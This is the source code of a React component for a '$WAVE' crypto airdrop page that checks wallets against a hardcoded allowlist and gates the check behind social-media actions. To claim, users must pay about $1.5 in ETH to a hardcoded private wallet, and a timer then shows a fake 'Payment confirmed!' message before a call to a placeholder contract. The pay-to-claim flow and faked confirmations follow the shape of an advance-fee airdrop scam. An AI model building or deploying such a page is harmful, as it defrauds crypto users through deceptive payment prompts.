"use client"

import { useState, useEffect } from "react"
import { Copy, Check } from "lucide-react"

declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: any[] }) => Promise<any>
      on: (event: string, callback: (accounts: string[]) => void) => void
      removeListener: (event: string, callback: (accounts: string[]) => void) => void
      isMetaMask?: boolean
      isCoinbaseWallet?: boolean
    }
  }
}

const ALLOWLIST = [
  "0x00000000219ab540356cbb839cbe05303d7705fa",
  "0x640AE2F3c8a447A302F338368e653e156da1e321",
  "0x00000000219ab540356cbb839cbe05303d7705aa",
  "0x1c1fe05e7d9ee41a304f14f1819fef414406fe70",
  "0x44afd3500643930319bb16B4a5c3a1e71638888d",
]

const CONTRACT_ADDRESS = "0x000000000000000000000000000000000000000" // Linea contract address
const LINEA_CHAIN_ID = "0xe708" // Linea mainnet chain ID (59144)
const PAYMENT_RECIPIENT = "0x640AE2F3c8a447A302F338368e653e156da1e321" // Replace with your wallet address

const isValidContractAddress = CONTRACT_ADDRESS !== "0xYOUR_CONTRACT_ADDRESS" && CONTRACT_ADDRESS.length === 42

interface AirdropPageProps {
  isConnected: boolean
  connectedAddress: string
  connectWallet: () => Promise<void>
  disconnectWallet: () => void
  isConnecting: boolean
}

export default function AirdropPage({
  isConnected,
  connectedAddress,
  connectWallet,
  disconnectWallet,
  isConnecting,
}: AirdropPageProps) {
  const [totalClaimed, setTotalClaimed] = useState(0)
  const [walletAddress, setWalletAddress] = useState("")
  const [checkResult, setCheckResult] = useState<"eligible" | "ineligible" | null>(null)
  const [isChecking, setIsChecking] = useState(false)
  const [hasClaimed, setHasClaimed] = useState(false)
  const [isClaiming, setIsClaiming] = useState(false)
  const [claimStatus, setClaimStatus] = useState<{
    step: "idle" | "payment" | "claim" | "success" | "failed"
    message: string
    paymentHash?: string
    claimHash?: string
  }>({ step: "idle", message: "" })
  const [showConnectModal, setShowConnectModal] = useState(false)
  const [copied, setCopied] = useState(false)
  const [showSocialModal, setShowSocialModal] = useState(false)

  useEffect(() => {
    fetchTotalClaims()
  }, [])

  const fetchTotalClaims = async () => {
    try {
      if (!isValidContractAddress) {
        console.log("[v0] Contract address not configured, using fallback")
        setTotalClaimed(0)
        return
      }

      if (typeof window !== "undefined" && window.ethereum) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: LINEA_CHAIN_ID }],
          })
        } catch (networkError: any) {
          if (networkError.code === 4902) {
            try {
              await window.ethereum.request({
                method: "wallet_addEthereumChain",
                params: [
                  {
                    chainId: LINEA_CHAIN_ID,
                    chainName: "Linea",
                    nativeCurrency: {
                      name: "Ethereum",
                      symbol: "ETH",
                      decimals: 18,
                    },
                    rpcUrls: ["https://rpc.linea.build"],
                    blockExplorerUrls: ["https://lineascan.build"],
                  },
                ],
              })
            } catch (addError) {
              console.error("Failed to add Linea network:", addError)
              setTotalClaimed(0)
              return
            }
          } else {
            console.log("[v0] Network switch failed, using fallback value")
            setTotalClaimed(0)
            return
          }
        }

        try {
          const result = await window.ethereum.request({
            method: "eth_call",
            params: [
              {
                to: CONTRACT_ADDRESS,
                data: "0x4b0e7216", // Function selector for totalClaims()
              },
              "latest",
            ],
          })

          const claimsCount = Number.parseInt(result, 16)
          setTotalClaimed(claimsCount)
          console.log("[v0] Successfully fetched total claims:", claimsCount)
        } catch (contractError) {
          console.error("[v0] Contract call failed:", contractError)
          console.log("[v0] Using fallback value due to contract call failure")
          setTotalClaimed(0)
        }
      } else {
        console.log("[v0] No ethereum provider found, using fallback")
        setTotalClaimed(0)
      }
    } catch (error) {
      console.error("Error fetching total claims:", error)
      console.log("[v0] General error occurred, using fallback value")
      setTotalClaimed(0)
    }
  }

  const checkAirdrop = async () => {
    const addressToCheck = walletAddress.trim() || connectedAddress
    if (!addressToCheck) return

    setShowSocialModal(true)
  }

  const proceedWithAirdropCheck = async () => {
    setShowSocialModal(false)

    const addressToCheck = walletAddress.trim() || connectedAddress
    if (!addressToCheck) return

    setIsChecking(true)
    setCheckResult(null)

    await new Promise((resolve) => setTimeout(resolve, 1500))

    const normalizedAddress = addressToCheck.toLowerCase().trim()
    const isEligible = ALLOWLIST.some((addr) => addr.toLowerCase() === normalizedAddress)
    setCheckResult(isEligible ? "eligible" : "ineligible")

    setIsChecking(false)
  }

  const getPaymentAmount = async (): Promise<string> => {
    try {
      const ethPriceUSD = 2500
      const paymentUSD = 1.5
      const ethAmount = paymentUSD / ethPriceUSD
      const weiAmount = Math.floor(ethAmount * 1e18)
      return `0x${weiAmount.toString(16)}`
    } catch (error) {
      return "0x2386F26FC10000" // ~0.0006 ETH in wei
    }
  }

  const handleClaim = async () => {
    if (!isConnected) {
      await connectWallet()
      return
    }

    if (!isValidContractAddress) {
      alert("Contract address is not configured. Please update CONTRACT_ADDRESS in the code.")
      return
    }

    const normalizedConnectedAddress = connectedAddress.toLowerCase()
    const isConnectedWalletEligible = ALLOWLIST.some((addr) => addr.toLowerCase() === normalizedConnectedAddress)

    if (!isConnectedWalletEligible) {
      alert("Your connected wallet is not eligible for the airdrop")
      return
    }

    setIsClaiming(true)
    setClaimStatus({ step: "payment", message: "Processing payment of $1.5..." })

    try {
      if (window.ethereum) {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: LINEA_CHAIN_ID }],
        })

        const paymentAmount = await getPaymentAmount()

        const paymentTxHash = await window.ethereum.request({
          method: "eth_sendTransaction",
          params: [
            {
              from: connectedAddress,
              to: PAYMENT_RECIPIENT,
              value: paymentAmount,
              gas: "0x5208", // 21000 gas limit for simple transfer
            },
          ],
        })

        console.log("[v0] Payment transaction sent:", paymentTxHash)
        setClaimStatus({
          step: "payment",
          message: "Payment successful! Waiting for confirmation...",
          paymentHash: paymentTxHash,
        })

        await new Promise((resolve) => setTimeout(resolve, 3000))

        setClaimStatus({
          step: "claim",
          message: "Payment confirmed! Processing airdrop claim...",
          paymentHash: paymentTxHash,
        })

        const claimTxHash = await window.ethereum.request({
          method: "eth_sendTransaction",
          params: [
            {
              from: connectedAddress,
              to: CONTRACT_ADDRESS,
              data: "0x4e71d92d", // Function selector for claim()
              gas: "0x7530", // 30000 gas limit for contract interaction
            },
          ],
        })

        console.log("[v0] Claim transaction sent:", claimTxHash)

        setClaimStatus({
          step: "success",
          message: "Both payment and claim successful!",
          paymentHash: paymentTxHash,
          claimHash: claimTxHash,
        })

        setHasClaimed(true)

        setTimeout(() => {
          fetchTotalClaims()
        }, 3000)
      }
    } catch (error: any) {
      console.error("Claim process failed:", error)
      let errorMessage = "Transaction failed. Please try again."

      if (error.code === 4001) {
        errorMessage = "Transaction was rejected by user"
      } else if (error.code === -32603) {
        errorMessage = "Transaction failed. Please check your balance and try again."
      } else if (error.message?.includes("insufficient funds")) {
        errorMessage = "Insufficient funds for payment and gas fees."
      }

      setClaimStatus({
        step: "failed",
        message: errorMessage,
      })

      setTimeout(() => {
        setClaimStatus({ step: "idle", message: "" })
      }, 5000)
    } finally {
      setIsClaiming(false)
    }
  }

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(walletAddress)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch (err) {
      console.error("Failed to copy:", err)
    }
  }

  const handleConnectWallet = () => {
    setShowConnectModal(true)
  }

  const handleModalConnect = async () => {
    setShowConnectModal(false)
    await connectWallet()
  }

  return (
    <div className="relative min-h-screen overflow-hidden">
      <div className="fixed inset-0 bg-gradient-to-br from-slate-900 via-blue-900 to-slate-800">
        <div className="absolute inset-0 opacity-30">
          <div
            className="absolute inset-0"
            style={{
              backgroundImage: `radial-gradient(circle, #3b82f6 1px, transparent 1px)`,
              backgroundSize: "40px 40px",
              backgroundPosition: "0 0, 20px 20px",
            }}
          ></div>
        </div>

        <div className="absolute inset-0">
          <div className="absolute top-20 left-16 w-12 h-12 bg-orange-500 rounded-full flex items-center justify-center animate-float shadow-lg shadow-orange-500/30">
            <svg className="w-8 h-8 text-white" viewBox="0 0 24 24" fill="currentColor">
              <path d="M23.638 14.904c-1.602 6.43-8.113 10.34-14.542 8.736C2.67 22.05-1.244 15.525.362 9.105 1.962 2.67 8.475-1.243 14.9.358c6.43 1.605 10.342 8.115 8.738 14.546z" />
              <path d="M17.415 11.037c.218-1.454-.89-2.236-2.403-2.758l.491-1.968-1.198-.299-.478 1.915c-.315-.078-.638-.152-.958-.225l.482-1.932-1.198-.299-.491 1.968c-.261-.059-.517-.117-.766-.178l.001-.006-1.652-.412-.318 1.276s.89.204.871.217c.486.121.574.442.559.697l-.56 2.246c.034.009.077.022.125.042l-.126-.031-.784 3.144c-.059.146-.209.365-.547.282.012.017-.871-.217-.871-.217L8.53 16.53l1.563.39c.291.073.576.149.856.221l-.496 1.991 1.198.299.491-1.968c.328.089.646.171.958.247l-.49 1.956 1.198.299.496-1.988c2.046.387 3.584.231 4.23-1.617.522-1.49-.026-2.35-1.103-2.91.785-.181 1.375-.695 1.534-1.756z" />
              <path d="M15.934 17.97L4.58 13.62 11.943 24l7.37-10.38-7.372 4.35h.003zM16.305 11.013c-.338 1.354-2.423.667-3.098.498l.596-2.391c.675.169 2.849.484 2.502 1.893z" />
              <path d="M16.305 11.013c-.338 1.354-2.423.667-3.098.498l.596-2.391c.675.169 2.849.484 2.502 1.893z" />
            </svg>
          </div>

          <div className="absolute top-32 right-20 w-14 h-14 bg-blue-600 rounded-lg flex items-center justify-center animate-float-delayed shadow-lg shadow-blue-600/30">
            <svg className="w-8 h-8 text-white" viewBox="0 0 24 24" fill="currentColor">
              <path d="M11.944 17.97L4.58 13.62 11.943 24l7.37-10.38-7.372 4.35h.003zM12.056 0L4.69 12.223l-3.693-3.6832L5.6 4.9045l6.4 6.4 6.4-6.4-2.707-2.7155z" />
            </svg>
          </div>

          <div className="absolute top-1/2 left-12 w-12 h-12 bg-emerald-500 rounded-full flex items-center justify-center animate-pulse shadow-lg shadow-emerald-500/30">
            <svg className="w-7 h-7 text-white" viewBox="0 0 24 24" fill="currentColor">
              <path d="M2 6h20v2H2V6zm0 5h20v2H2v-2zm0 5h20v2H2v-2z" />
            </svg>
          </div>

          <div className="absolute bottom-32 right-16 w-12 h-12 bg-yellow-500 rounded-lg flex items-center justify-center animate-bounce-slow shadow-lg shadow-yellow-500/30">
            <svg className="w-8 h-8 text-white" viewBox="0 0 24 24" fill="currentColor">
              <path d="M16.624 13.9202l2.7175 2.7154-7.353 7.353-7.353-7.353 2.7175-2.7154L12 18.5589l4.624-4.6387zm-.931-11.73L12 5.8732l-3.693-3.6832L5.6 4.9045l6.4 6.4 6.4-6.4-2.707-2.7155z" />
            </svg>
          </div>

          <div className="absolute bottom-40 left-20 w-11 h-11 bg-blue-500 rounded-full flex items-center justify-center animate-float shadow-lg shadow-blue-500/30">
            <svg className="w-6 h-6 text-white" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 16.894a8.9 8.9 0 01-11.788 0 8.9 8.9 0 010-11.788 8.9 8.9 0 0111.788 0 8.9 8.9 0 010 11.788z" />
              <circle cx="12" cy="12" r="3" />
            </svg>
          </div>

          <div className="absolute top-1/2 right-12 w-10 h-10 bg-purple-500 rounded-lg flex items-center justify-center animate-float-delayed shadow-lg shadow-purple-500/30">
            <svg className="w-6 h-6 text-white" viewBox="0 0 24 24" fill="currentColor">
              <path d="M3.9 12.7l2.8-2.8c.2-.2.4-.3.7-.3h12.8c.5 0 .8.6.5 1l-2.8 2.8c-.2.2-.4.3-.7.3H4.4c-.5 0-.8-.6-.5-1z" />
              <path d="M3.9 5.3l2.8-2.8c.2-.2.4-.3.7-.3h12.8c.5 0 .8.6.5 1l-2.8 2.8c-.2.2-.4.3-.7.3H4.4c-.5 0-.8-.6-.5-1z" />
              <path d="M20.1 18.7l-2.8 2.8c-.2.2-.4.3-.7.3H3.8c-.5 0-.8-.6-.5-1l2.8-2.8c.2-.2.4-.3.7-.3h12.8c.5 0 .8.6.5 1z" />
            </svg>
          </div>

          <div className="absolute top-24 left-1/2 transform -translate-x-1/2 w-10 h-10 bg-purple-600 rounded-full flex items-center justify-center animate-pulse shadow-lg shadow-purple-600/30">
            <svg className="w-6 h-6 text-white" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 0L1.608 6v12L12 24l10.392-6V6L12 0zm-1.073 17.543L3.75 13.97v-3.914l7.177 3.573v7.914zm8.323-3.573l-7.177 3.573v-7.914L19.25 10.056v3.914z" />
            </svg>
          </div>
        </div>
      </div>

      <div className="relative z-10 flex flex-col items-center justify-center text-white px-4 py-8 min-h-screen">
        {showSocialModal && (
          <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
            <div className="bg-slate-900/90 backdrop-blur-md border border-blue-300/30 rounded-xl p-6 max-w-md w-full mx-4 shadow-2xl">
              <h3 className="text-xl font-bold text-center mb-4 text-gold">Social Media Engagement Required</h3>
              <p className="text-blue-200 text-center mb-6 text-sm">
                To continue with the airdrop check, please complete these actions on X (Twitter):
              </p>

              <div className="bg-blue-500/20 border border-blue-300/30 rounded-lg p-4 mb-6">
                <p className="text-blue-100 text-sm text-center mb-3">📱 Please complete these actions:</p>
                <ul className="text-blue-200 text-sm space-y-2">
                  <li>• Like the post</li>
                  <li>• Retweet the post</li>
                  <li>• Follow @SadlifeTv</li>
                  <li>• Then return here to continue</li>
                </ul>
              </div>

              <a
                href="https://x.com/SadlifeTv_/status/1769708489658495122"
                target="_blank"
                rel="noopener noreferrer"
                className="block w-full py-3 bg-blue-500 hover:bg-blue-400 hover:shadow-lg hover:shadow-blue-400/50 rounded-lg font-semibold text-center transition-all duration-300 backdrop-blur-sm border border-blue-300/20 mb-4"
              >
                Open X Post
              </a>

              <div className="flex gap-3">
                <button
                  onClick={proceedWithAirdropCheck}
                  className="flex-1 py-3 bg-green-500 hover:bg-green-400 hover:shadow-lg hover:shadow-green-400/50 rounded-lg font-semibold transition-all duration-300"
                >
                  I've Completed All Actions
                </button>
                <button
                  onClick={() => setShowSocialModal(false)}
                  className="flex-1 py-3 bg-slate-600/50 hover:bg-slate-600/70 rounded-lg font-semibold transition-colors duration-200"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        )}

        {showConnectModal && (
          <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
            <div className="bg-slate-900/90 backdrop-blur-md border border-blue-300/30 rounded-xl p-6 max-w-sm w-full mx-4 shadow-2xl">
              <h3 className="text-xl font-bold text-center mb-4 text-gold">Connect Your Wallet</h3>
              <p className="text-blue-200 text-center mb-6 text-sm">
                Connect your wallet to check eligibility and claim your airdrop
              </p>
              <div className="flex gap-3">
                <button
                  onClick={handleModalConnect}
                  disabled={isConnecting}
                  className="flex-1 py-3 bg-blue-500 hover:bg-blue-400 hover:shadow-lg hover:shadow-blue-400/50 disabled:bg-blue-600/50 disabled:cursor-not-allowed rounded-lg font-semibold transition-all duration-300 backdrop-blur-sm border border-blue-300/20"
                >
                  {isConnecting ? "Connecting..." : "Connect"}
                </button>
                <button
                  onClick={() => setShowConnectModal(false)}
                  className="flex-1 py-3 bg-slate-600/50 hover:bg-slate-600/70 rounded-lg font-semibold transition-colors duration-200"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        )}

        {!isValidContractAddress && (
          <div className="fixed top-4 left-4 right-4 bg-yellow-500/20 border border-yellow-300/30 rounded-lg p-3 text-yellow-100 text-sm backdrop-blur-sm">
            ⚠️ Contract address not configured. Replace CONTRACT_ADDRESS with your actual Linea contract address.
          </div>
        )}

        <div className="mb-8">
          <div className="w-16 h-16 bg-blue-400/30 rounded-lg flex items-center justify-center backdrop-blur-sm border border-blue-300/20">
            <span className="text-2xl font-bold text-white">P</span>
          </div>
        </div>

        <h1 className="text-4xl md:text-6xl font-bold mb-4 text-center tracking-wide bg-gradient-to-r from-purple-400 via-pink-500 to-red-500 bg-clip-text text-transparent animate-pulse">
          $WAVE
        </h1>

        <p className="text-lg md:text-xl text-blue-100 mb-8 text-center">Check your wallet eligibility</p>

        <div className="mb-6">
          {!isConnected ? (
            <button
              onClick={handleConnectWallet}
              disabled={isConnecting}
              className="px-6 py-3 bg-blue-500 hover:bg-blue-400 hover:shadow-lg hover:shadow-blue-400/50 disabled:bg-blue-600/50 disabled:cursor-not-allowed rounded-lg font-semibold transition-all duration-300 backdrop-blur-sm border border-blue-300/20 glow-button"
            >
              {isConnecting ? "Connecting..." : "Connect Wallet"}
            </button>
          ) : (
            <div className="flex items-center gap-3">
              <div className="px-4 py-2 bg-green-500/20 rounded-lg border border-green-300/30">
                <span className="text-green-100 text-sm">
                  Connected: {connectedAddress.slice(0, 6)}...{connectedAddress.slice(-4)}
                </span>
              </div>
              <button
                onClick={disconnectWallet}
                className="px-4 py-2 bg-red-500/20 hover:bg-red-500/30 rounded-lg text-red-100 text-sm transition-colors duration-200"
              >
                Disconnect
              </button>
            </div>
          )}
        </div>

        <div className="w-full max-w-md mb-12 space-y-4">
          <div className="space-y-2">
            <div className="relative">
              <input
                type="text"
                placeholder={
                  isConnected ? "Leave empty to check connected wallet" : "Enter wallet address to check eligibility"
                }
                value={walletAddress}
                onChange={(e) => setWalletAddress(e.target.value)}
                className="w-full px-4 py-3 pr-12 bg-blue-400/20 border border-blue-300/30 rounded-lg placeholder-blue-200 text-white backdrop-blur-sm focus:outline-none focus:border-blue-300/50 shadow-lg shadow-black/20"
              />
              {walletAddress && (
                <button
                  onClick={copyToClipboard}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 p-1 hover:bg-blue-500/20 rounded transition-colors duration-200"
                >
                  {copied ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4 text-blue-300" />}
                </button>
              )}
            </div>
          </div>

          <button
            onClick={checkAirdrop}
            disabled={(!walletAddress.trim() && !connectedAddress) || isChecking}
            className="w-full py-3 bg-blue-500 hover:bg-blue-400 hover:shadow-lg hover:shadow-blue-400/50 disabled:bg-blue-600/50 disabled:cursor-not-allowed rounded-lg font-semibold transition-all duration-300 backdrop-blur-sm border border-blue-300/20 glow-button"
          >
            {isChecking ? "Checking..." : "Check Airdrop"}
          </button>

          {checkResult && (
            <div
              className={`p-4 rounded-lg backdrop-blur-sm border ${
                checkResult === "eligible"
                  ? "bg-green-500/20 border-green-300/30 text-green-100"
                  : "bg-red-500/20 border-red-300/30 text-red-100"
              }`}
            >
              <div className="text-center">
                <div className="text-lg font-semibold mb-2">
                  {checkResult === "eligible" ? "✅ Eligible" : "❌ Not Eligible"}
                </div>
                <div className="text-sm">
                  {checkResult === "eligible"
                    ? "Your wallet is eligible for the airdrop!"
                    : "Your wallet is not eligible for this airdrop."}
                </div>

                {checkResult === "eligible" && !hasClaimed && (
                  <div className="mt-4 space-y-2">
                    <div className="text-xs text-green-200 mb-2">
                      Claim process: $1.5 payment → Airdrop claim (both on Linea network)
                    </div>
                    <button
                      onClick={handleClaim}
                      disabled={isClaiming}
                      className="px-6 py-2 bg-green-500 hover:bg-green-400 hover:shadow-lg hover:shadow-green-400/50 disabled:bg-green-600/50 disabled:cursor-not-allowed rounded-lg font-semibold transition-all duration-300 glow-button"
                    >
                      {isClaiming
                        ? "Processing..."
                        : isConnected
                          ? "Pay $1.5 & Claim Airdrop"
                          : "Connect Wallet & Claim"}
                    </button>
                  </div>
                )}

                {claimStatus.step !== "idle" && (
                  <div
                    className={`mt-4 p-3 rounded-lg text-sm ${
                      claimStatus.step === "success"
                        ? "bg-green-500/20 border border-green-300/30 text-green-100"
                        : claimStatus.step === "failed"
                          ? "bg-red-500/20 border border-red-300/30 text-red-100"
                          : "bg-blue-500/20 border border-blue-300/30 text-blue-100"
                    }`}
                  >
                    <div className="font-semibold mb-2">
                      {claimStatus.step === "payment" && "💳 Payment Step"}
                      {claimStatus.step === "claim" && "🎁 Claim Step"}
                      {claimStatus.step === "success" && "✅ Success!"}
                      {claimStatus.step === "failed" && "❌ Failed"}
                    </div>
                    <div>{claimStatus.message}</div>
                    {claimStatus.paymentHash && (
                      <div className="mt-2 text-xs">
                        Payment TX: {claimStatus.paymentHash.slice(0, 10)}...{claimStatus.paymentHash.slice(-8)}
                      </div>
                    )}
                    {claimStatus.claimHash && (
                      <div className="text-xs">
                        Claim TX: {claimStatus.claimHash.slice(0, 10)}...{claimStatus.claimHash.slice(-8)}
                      </div>
                    )}
                  </div>
                )}

                {hasClaimed && <div className="mt-3 text-green-200 font-semibold">✅ Successfully Claimed!</div>}
              </div>
            </div>
          )}
        </div>

        <div className="text-center space-y-6">
          <div className="text-blue-200 text-sm uppercase tracking-wider">AIRDROP STATS</div>

          <div className="inline-block p-6 rounded-xl bg-slate-900/50 backdrop-blur-md border-2 border-gold/50 shadow-lg shadow-gold/20 glow-border">
            <div className="text-4xl md:text-5xl font-bold text-gold glow-text">{totalClaimed}</div>
            <div className="text-lg text-blue-200 mt-2">Total Claimed</div>
          </div>
        </div>
      </div>

      <style jsx>{`
        .text-gold {
          color: #ffd700;
        }
        
        .glow-text {
          text-shadow: 0 0 10px #ffd700, 0 0 20px #ffd700, 0 0 30px #ffd700;
        }
        
        .glow-button:hover:not(:disabled) {
          box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
        }
        
        .glow-border {
          box-shadow: 0 0 20px rgba(255, 215, 0, 0.3), inset 0 0 20px rgba(255, 215, 0, 0.1);
        }
        
        .border-gold {
          border-color: #ffd700;
        }

        @keyframes float {
          0%, 100% { transform: translateY(0px) rotate(0deg); }
          50% { transform: translateY(-10px) rotate(5deg); }
        }
        
        @keyframes float-delayed {
          0%, 100% { transform: translateY(0px) rotate(0deg); }
          50% { transform: translateY(-15px) rotate(-5deg); }
        }
        
        @keyframes bounce-slow {
          0%, 100% { transform: translateY(0px); }
          50% { transform: translateY(-8px); }
        }
        
        .animate-float {
          animation: float 4s ease-in-out infinite;
        }
        
        .animate-float-delayed {
          animation: float-delayed 5s ease-in-out infinite 1s;
        }
        
        .animate-bounce-slow {
          animation: bounce-slow 3s ease-in-out infinite;
        }
      `}</style>
    </div>
  )
}
